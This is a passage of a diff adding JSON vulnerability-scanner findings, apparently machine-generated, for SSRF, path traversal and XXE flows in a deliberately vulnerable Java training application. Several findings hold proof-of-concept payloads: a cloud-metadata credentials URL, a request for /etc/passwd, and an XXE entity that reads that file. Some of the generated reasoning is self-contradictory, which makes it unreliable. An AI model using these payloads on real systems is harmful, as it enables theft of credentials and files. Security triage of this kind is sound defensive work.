+      "cwe": "CWE-918",
+      "source": "@RequestParam(FILE_URL) String url",
+      "sink": "URLConnection.openConnection() followed by reading InputStream",
+      "data_flow_valid": true,
+      "sanitization_present": false,
+      "reasoning": "User-controlled URL parameter is only syntactically validated (URL parsing) and then used to open a network connection. No host\u2011allowlist or protocol restrictions prevent internal or malicious endpoints, allowing an attacker to induce the server to make arbitrary HTTP/HTTPS (or other) requests.",
+      "evidence": [
+        "The method getVulnerablePayloadLevel1 receives the URL via @RequestParam and passes it to isUrlValid, which only checks that the string can be parsed as a URL.",
+        "If isUrlValid returns true, the URL is passed to getGenericVulnerabilityResponseWhenURL, which again validates syntactically and then creates a new URL object.",
+        "MetaDataServiceMock.isPresent(u) only whitelists hosts present in IP_ENVIRONMENT_MAP; otherwise the code falls back to getResponseForURLConnection(u).",
+        "getResponseForURLConnection(u) calls u.openConnection() and reads the response, effectively performing an outbound request to the attacker\u2011supplied URL."
+      ],
+      "poc": "Send a request to /LEVEL_1/SSRF?url=http://internal-service.local/secret and observe that the response contains the content fetched from the internal service.",
+      "requires_dynamic_validation": true,
+      "validation_tier": "tier2_fast_llm",
+      "latency_ms": 29589,
+      "retry_count": 0,
+      "parse_success": true,
+      "generated_poc": {
+        "error": "Failed to generate valid PoC JSON"
+      }
+    },
+    {
+      "category": "ssrf",
+      "subtype": "CWE-918",
+      "path": [
+        {
+          "code": "@RequestParam(FILE_URL) String url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 187
+        },
+        {
+          "code": "url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 188
+        },
+        {
+          "code": "String url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 46
+        },
+        {
+          "code": "url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 48
+        },
+        {
+          "code": "String url",
+          "file": "unknown",
+          "line": -1
+        },
+        {
+          "code": "url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 188
+        },
+        {
+          "code": "url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 188
+        },
+        {
+          "code": "url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 189
+        },
+        {
+          "code": "url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 192
+        },
+        {
+          "code": "@RequestParam(FILE_URL) String url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 64
+        },
+        {
+          "code": "url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 66
+        },
+        {
+          "code": "String url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 46
+        },
+        {
+          "code": "url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 48
+        },
+        {
+          "code": "String url",
+          "file": "unknown",
+          "line": -1
+        },
+        {
+          "code": "url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 66
+        },
+        {
+          "code": "url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 67
+        },
+        {
+          "code": "u",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 67
+        },
+        {
+          "code": "u",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 68
+        },
+        {
+          "code": "URL url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\MetaDataServiceMock.java",
+          "line": 168
+        },
+        {
+          "code": "url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\MetaDataServiceMock.java",
+          "line": 169
+        },
+        {
+          "code": "URL url",
+          "file": "unknown",
+          "line": -1
+        },
+        {
+          "code": "u",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 68
+        },
+        {
+          "code": "u",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 76
+        },
+        {
+          "code": "URL u",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 84
+        },
+        {
+          "code": "u",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 85
+        },
+        {
+          "code": "u.openConnection()",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 85
+        },
+        {
+          "code": "urlConnection",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 85
+        },
+        {
+          "code": "URLConnection urlConnection = u.openConnection()",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 85
+        }
+      ],
+      "chain_id": null,
+      "anonymized_path": [
+        "@<FUNC_1>(<VAR_1>)<VAR_2><VAR_3>",
+        "<VAR_3>",
+        "<VAR_2><VAR_3>",
+        "<VAR_3>",
+        "<VAR_2><VAR_3>",
+        "<VAR_3>",
+        "<VAR_3>",
+        "<VAR_3>",
+        "<VAR_3>",
+        "@<FUNC_1>(<VAR_1>)<VAR_2><VAR_3>",
+        "<VAR_3>",
+        "<VAR_2><VAR_3>",
+        "<VAR_3>",
+        "<VAR_2><VAR_3>",
+        "<VAR_3>",
+        "<VAR_3>",
+        "<VAR_4>",
+        "<VAR_4>",
+        "<VAR_5><VAR_3>",
+        "<VAR_3>",
+        "<VAR_5><VAR_3>",
+        "<VAR_4>",
+        "<VAR_4>",
+        "<VAR_5><VAR_4>",
+        "<VAR_4>",
+        "<VAR_4>.<ATTR_1>()",
+        "<VAR_6>",
+        "<VAR_7><VAR_6>=<VAR_4>.<ATTR_1>()"
+      ],
+      "fingerprint": "a948da762d5e46f9aeeab5138b1386b8fd54341e0ea4575146fbdc5159135d99",
+      "context_hash": "578a8021426bf9c3248d5563559a78c59c5ebf7436afffe4ea655ea448e864a3",
+      "instances": [
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "source_line": 187,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "sink_line": 85
+        },
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "source_line": 159,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "sink_line": 85
+        }
+      ],
+      "verdict": "VALID",
+      "verdict_confidence": 0.92,
+      "vulnerability_type": "Server Side Request Forgery",
+      "cwe": "CWE-918",
+      "source": "@RequestParam(FILE_URL) String url (HTTP request parameter)",
+      "sink": "URLConnection.openConnection() followed by reading the response",
+      "data_flow_valid": true,
+      "sanitization_present": true,
+      "reasoning": "The request parameter 'url' is passed through a syntactic validator (isUrlValid) and a protocol check that only blocks the 'file' scheme. Afterwards the code checks MetaDataServiceMock.isPresent(), which blocks URLs whose host appears in a whitelist (IP_ENVIRONMENT_MAP). All other HTTP URLs are allowed and later used to open a URLConnection and read data. The validation is merely a whitelist that is used to reject known safe hosts, effectively allowing any non\u2011whitelisted host, including internal IPs, to be fetched. This constitutes a bypassable validation and results in an exploitable SSRF sink.",
+      "evidence": [
+        "Source parameter 'url' is attacker\u2011controlled via @RequestParam.",
+        "isUrlValid() only verifies URL syntax and that it is not a file:// URL.",
+        "MetaDataServiceMock.isPresent() returns true only for whitelisted hosts and causes an early error response; otherwise the code proceeds to open the connection.",
+        "URLConnection.openConnection() reads data from the supplied URL, exposing the server to SSRF."
+      ],
+      "poc": "GET /vulnerable/ssrf?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name",
+      "requires_dynamic_validation": true,
+      "validation_tier": "tier2_fast_llm",
+      "latency_ms": 11309,
+      "retry_count": 0,
+      "parse_success": true,
+      "generated_poc": {
+        "error": "Failed to generate valid PoC JSON"
+      }
+    },
+    {
+      "category": "ssrf",
+      "subtype": "CWE-918",
+      "path": [
+        {
+          "code": "@RequestParam(FILE_URL) String url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 64
+        },
+        {
+          "code": "url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 66
+        },
+        {
+          "code": "String url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 46
+        },
+        {
+          "code": "url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 48
+        },
+        {
+          "code": "String url",
+          "file": "unknown",
+          "line": -1
+        },
+        {
+          "code": "url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 66
+        },
+        {
+          "code": "url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 67
+        },
+        {
+          "code": "u",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 67
+        },
+        {
+          "code": "u",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 68
+        },
+        {
+          "code": "URL url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\MetaDataServiceMock.java",
+          "line": 168
+        },
+        {
+          "code": "url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\MetaDataServiceMock.java",
+          "line": 169
+        },
+        {
+          "code": "URL url",
+          "file": "unknown",
+          "line": -1
+        },
+        {
+          "code": "u",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 68
+        },
+        {
+          "code": "u",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 76
+        },
+        {
+          "code": "URL u",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 84
+        },
+        {
+          "code": "u",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 85
+        },
+        {
+          "code": "u.openConnection()",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 85
+        }
+      ],
+      "chain_id": null,
+      "anonymized_path": [
+        "@<FUNC_1>(<VAR_1>)<VAR_2><VAR_3>",
+        "<VAR_3>",
+        "<VAR_2><VAR_3>",
+        "<VAR_3>",
+        "<VAR_2><VAR_3>",
+        "<VAR_3>",
+        "<VAR_3>",
+        "<VAR_4>",
+        "<VAR_4>",
+        "<VAR_5><VAR_3>",
+        "<VAR_3>",
+        "<VAR_5><VAR_3>",
+        "<VAR_4>",
+        "<VAR_4>",
+        "<VAR_5><VAR_4>",
+        "<VAR_4>",
+        "<VAR_4>.<ATTR_1>()"
+      ],
+      "fingerprint": "d823343fab87134fc6ded890f883b6b033559b2b3c3ddf8d0522ea03f4674126",
+      "context_hash": "44465fd616e0d2b397b7a4ea12c1f0925dda0a17afc956813afa0845fc464a0e",
+      "instances": [
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "source_line": 64,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "sink_line": 85
+        }
+      ],
+      "verdict": "VALID",
+      "verdict_confidence": 0.94,
+      "vulnerability_type": "Server Side Request Forgery",
+      "cwe": "CWE-918",
+      "source": "@RequestParam(FILE_URL) String url",
+      "sink": "URLConnection urlConnection = u.openConnection()",
+      "data_flow_valid": true,
+      "sanitization_present": false,
+      "reasoning": "The attacker-controlled request parameter 'url' is passed through a syntactic validator (isUrlValid) that does not restrict the destination. After validation the code creates a URL object and, unless the host matches an internal whitelist (handled by MetaDataServiceMock.isPresent), it falls back to getResponseForURLConnection which opens a network connection to the supplied URL. No effective sanitization or whitelist blocks external URLs, so an attacker can cause the server to make arbitrary HTTP requests, confirming an SSRF vulnerability.",
+      "evidence": [
+        "Source: @RequestParam(FILE_URL) String url is attacker-controlled.",
+        "isUrlValid only checks URL syntax and URI conversion, not host restrictions.",
+        "MetaDataServiceMock.isPresent returns true only for whitelisted internal IPs; when false the code proceeds to getResponseForURLConnection.",
+        "getResponseForURLConnection opens a URLConnection to the attacker-supplied URL and reads its response."
+      ],
+      "poc": "Send a request to the endpoint with url parameter set to an external address (e.g., http://example.com) and observe that the server fetches and returns the remote content.",
+      "requires_dynamic_validation": true,
+      "validation_tier": "tier2_fast_llm",
+      "latency_ms": 24958,
+      "retry_count": 0,
+      "parse_success": true,
+      "generated_poc": {
+        "error": "Failed to generate valid PoC JSON"
+      }
+    },
+    {
+      "category": "path_traversal",
+      "subtype": "CWE-22",
+      "path": [
+        {
+          "code": "@PathVariable('fileName') String fileName",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\fileupload\\PreflightController.java",
+          "line": 39
+        },
+        {
+          "code": "fileName",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\fileupload\\PreflightController.java",
+          "line": 43
+        },
+        {
+          "code": "this.unrestrictedFileUpload.getContentDispositionRoot().resolve(fileName)",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\fileupload\\PreflightController.java",
+          "line": 43
+        },
+        {
+          "code": "filePath",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\fileupload\\PreflightController.java",
+          "line": 43
+        },
+        {
+          "code": "filePath",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\fileupload\\PreflightController.java",
+          "line": 46
+        },
+        {
+          "code": "filePath.toFile()",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\fileupload\\PreflightController.java",
+          "line": 46
+        },
+        {
+          "code": "inputStream",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\fileupload\\PreflightController.java",
+          "line": 46
+        },
+        {
+          "code": "new FileInputStream(filePath.toFile())",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\fileupload\\PreflightController.java",
+          "line": 46
+        }
+      ],
+      "chain_id": null,
+      "anonymized_path": [
+        "@<FUNC_1>(<STR>)<VAR_1><VAR_2>",
+        "<VAR_2>",
+        "<VAR_3>.<ATTR_1>.<ATTR_2>().<ATTR_3>(<VAR_2>)",
+        "<VAR_4>",
+        "<VAR_4>",
+        "<VAR_4>.<ATTR_4>()",
+        "<VAR_5>",
+        "<VAR_6><FUNC_2>(<VAR_4>.<ATTR_4>())"
+      ],
+      "fingerprint": "5dd00c9d767f0c7123f7eddc870d7a4c8306e34c8b80a017dfd2570fa70a6d01",
+      "context_hash": "0ca05e67739a9f1795884c34d24b6b414a7ad1ee744e26dca881e588d5cf8ba3",
+      "instances": [
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\fileupload\\PreflightController.java",
+          "source_line": 39,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\fileupload\\PreflightController.java",
+          "sink_line": 46
+        }
+      ],
+      "verdict": "VALID",
+      "verdict_confidence": 0.92,
+      "vulnerability_type": "Path Traversal",
+      "cwe": "CWE-22",
+      "source": "fileName (from @PathVariable)",
+      "sink": "new FileInputStream(filePath.toFile())",
+      "data_flow_valid": true,
+      "sanitization_present": false,
+      "reasoning": "The method receives the file name directly from a URL path variable, resolves it against a base directory using Path.resolve, and then opens the resulting file without any normalization, whitelist validation, or block\u2011list checks. An attacker can supply \"../\" sequences in fileName to traverse out of the intended directory and read arbitrary files on the server.",
+      "evidence": [
+        "Source: @PathVariable(\"fileName\") String fileName",
+        "Path resolution: Path filePath = unrestrictedFileUpload.getContentDispositionRoot().resolve(fileName);",
+        "Sink: new FileInputStream(filePath.toFile()) reads the resolved file",
+        "No sanitization or validation of fileName is visible in the provided code"
+      ],
+      "poc": "GET /static/files/../../../../etc/passwd HTTP/1.1",
+      "requires_dynamic_validation": true,
+      "validation_tier": "tier2_fast_llm",
+      "latency_ms": 20108,
+      "retry_count": 0,
+      "parse_success": true,
+      "generated_poc": {
+        "error": "Failed to generate valid PoC JSON"
+      }
+    },
+    {
+      "category": "xxe",
+      "subtype": "CWE-611",
+      "path": [
+        {
+          "code": "in",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 147
+        },
+        {
+          "code": "in",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 151
+        },
+        {
+          "code": "InputStream in",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 103
+        },
+        {
+          "code": "in",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 106
+        },
+        {
+          "code": "$obj4",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 106
+        },
+        {
+          "code": "<empty>",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 106
+        },
+        {
+          "code": "spf.newSAXParser().getXMLReader()",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 106
+        },
+        {
+          "code": "xmlSource",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 106
+        },
+        {
+          "code": "xmlSource",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 110
+        },
+        {
+          "code": "jaxbUnmarshaller",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 110
+        },
+        {
+          "code": "(JAXBElement<Book>) (jaxbUnmarshaller.unmarshal(xmlSource))",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 110
+        }
+      ],
+      "chain_id": null,
+      "anonymized_path": [
+        "<VAR_1>",
+        "<VAR_1>",
+        "<VAR_2><VAR_1>",
+        "<VAR_1>",
+        "$<VAR_3>",
+        "<<VAR_4>>",
+        "<VAR_5>.<ATTR_1>().<ATTR_2>()",
+        "<VAR_6>",
+        "<VAR_6>",
+        "<VAR_7>",
+        "(<VAR_8><<VAR_9>>)(<VAR_7>.<ATTR_3>(<VAR_6>))"
+      ],
+      "fingerprint": "31edc6bb439077d4364836eb863144f4801d88f03529654e3ef512d85cdaf19a",
+      "context_hash": "881b15f423b97921036c192d2f4ff27e9764f74be74b1d15d4fc9261d43bdb46",
+      "instances": [
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "source_line": 147,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "sink_line": 110
+        },
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "source_line": 227,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "sink_line": 110
+        },
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "source_line": 199,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "sink_line": 110
+        },
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "source_line": 172,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "sink_line": 110
+        }
+      ],
+      "verdict": "VALID",
+      "verdict_confidence": 0.92,
+      "vulnerability_type": "XML External Entity (XXE)",
+      "cwe": "CWE-611",
+      "source": "request.getInputStream()",
+      "sink": "jaxbUnmarshaller.unmarshal(xmlSource)",
+      "data_flow_valid": true,
+      "sanitization_present": true,
+      "reasoning": "The request input stream is passed directly to a SAXParserFactory that only disables the external-general-entities feature. External-parameter-entities and DOCTYPE declarations remain enabled, allowing an attacker to craft XML that resolves external entities (e.g., file or network resources) during unmarshalling. The JAXB unmarshaller uses the configured XMLReader, so the partial mitigation does not prevent XXE exploitation.",
+      "evidence": [
+        "InputStream in = request.getInputStream();",
+        "spf.setFeature(\"http://xml.org/sax/features/external-general-entities\", false);",
+        "Source xmlSource = new SAXSource(spf.newSAXParser().getXMLReader(), new InputSource(in));",
+        "jaxbUnmarshaller.unmarshal(xmlSource)"
+      ],
+      "poc": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><book><title>&xxe;</title></book>",
+      "requires_dynamic_validation": true,
+      "validation_tier": "tier2_fast_llm",
+      "latency_ms": 23433,
+      "retry_count": 0,
+      "parse_success": true,
+      "generated_poc": {
+        "error": "Failed to generate valid PoC JSON"
+      },
+      "approval_state": "APPROVED"
+    },
+    {
+      "category": "xxe",
+      "subtype": "CWE-611",
+      "path": [
+        {
+          "code": "getInputStream()",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 172
+        },
+        {
+          "code": "in",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 172
+        },
+        {
+          "code": "in",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 178
+        },
+        {
+          "code": "InputStream in",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 103
+        },
+        {
+          "code": "in",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 106
+        },
+        {
+          "code": "$obj4",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 106
+        },
+        {
+          "code": "<empty>",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 106
+        },
+        {
+          "code": "spf.newSAXParser().getXMLReader()",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 106
+        },
+        {
+          "code": "xmlSource",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 106
+        },
+        {
+          "code": "xmlSource",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 110
+        },
+        {
+          "code": "jaxbUnmarshaller",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 110
+        },
+        {
+          "code": "(JAXBElement<Book>) (jaxbUnmarshaller.unmarshal(xmlSource))",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 110
+        }
+      ],
+      "chain_id": null,
+      "anonymized_path": [
+        "<FUNC_1>()",
+        "<VAR_1>",
+        "<VAR_1>",
+        "<VAR_2><VAR_1>",
+        "<VAR_1>",
+        "$<VAR_3>",
+        "<<VAR_4>>",
+        "<VAR_5>.<ATTR_1>().<ATTR_2>()",
+        "<VAR_6>",
+        "<VAR_6>",
+        "<VAR_7>",
+        "(<VAR_8><<VAR_9>>)(<VAR_7>.<ATTR_3>(<VAR_6>))"
+      ],
+      "fingerprint": "bc9d38c853ebb456def930beed6e7f80a029c2b3c55ae38da4da757836e1e7c0",
+      "context_hash": "8a0f7b1483b0a0a916707e0fd78500c0ca2259c9802432a42537361b1a256c07",
+      "instances": [
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "source_line": 172,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "sink_line": 110
+        },
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "source_line": 147,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "sink_line": 110
+        },
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "source_line": 227,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "sink_line": 110
+        },
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "source_line": 199,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "sink_line": 110
+        }
+      ],
+      "verdict": "FALSE_POSITIVE",
+      "verdict_confidence": 0.91,
+      "vulnerability_type": "XML External Entity (XXE)",
+      "cwe": "CWE-611",
+      "source": "request.getInputStream()",
+      "sink": "jaxbUnmarshaller.unmarshal(xmlSource)",
+      "data_flow_valid": true,
+      "sanitization_present": true,
+      "reasoning": "The code explicitly disables external general and parameter entities on the SAXParserFactory before unmarshalling, which is the recommended mitigation for XXE. Although it does not set the disallow-doctype-decl feature, the disabled external entity features prevent resolution of external entities, effectively mitigating the XXE risk. No evidence of bypassable validation is present, so the finding is a false positive with high confidence.",
+      "evidence": [
+        "SAXParserFactory spf = SAXParserFactory.newInstance();",
+        "spf.setFeature(\"http://xml.org/sax/features/external-general-entities\", false);",
+        "spf.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false);",
+        "Unmarshaller jaxbUnmarshaller = jc.createUnmarshaller();",
+        "jaxbUnmarshaller.unmarshal(xmlSource);"
+      ],
+      "poc": "N/A",
+      "requires_dynamic_validation": false,
+      "validation_tier": "tier2_fast_llm",
+      "latency_ms": 19446,
+      "retry_count": 0,
+      "parse_success": true
+    },
+    {
+      "category": "xxe",
+      "subtype": "CWE-611",
+      "path": [
+        {
+          "code": "request",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 72
+        },
+        {
+          "code": "getInputStream()",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 72
+        },
+        {
+          "code": "in",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 72
+        },
+        {
+          "code": "in",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 77
+        },
+        {
+          "code": "jaxbUnmarshaller",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 77
+        },
+        {
+          "code": "(JAXBElement<Book>) (jaxbUnmarshaller.unmarshal(in))",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 77
+        }
+      ],
+      "chain_id": null,
+      "anonymized_path": [
+        "request",
+        "<FUNC_1>()",
+        "<VAR_1>",
+        "<VAR_1>",
+        "<VAR_2>",
+        "(<VAR_3><<VAR_4>>)(<VAR_2>.<ATTR_1>(<VAR_1>))"
+      ],
+      "fingerprint": "69188153cc026972d37a54d646e839053fbe7b59cb85cd59793aee0d07c01a5f",
+      "context_hash": "642f6e66fedfc981e2e2a0e7e356493e6c927449a806fe51254eaf64f7de891b",
+      "instances": [
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "source_line": 72,
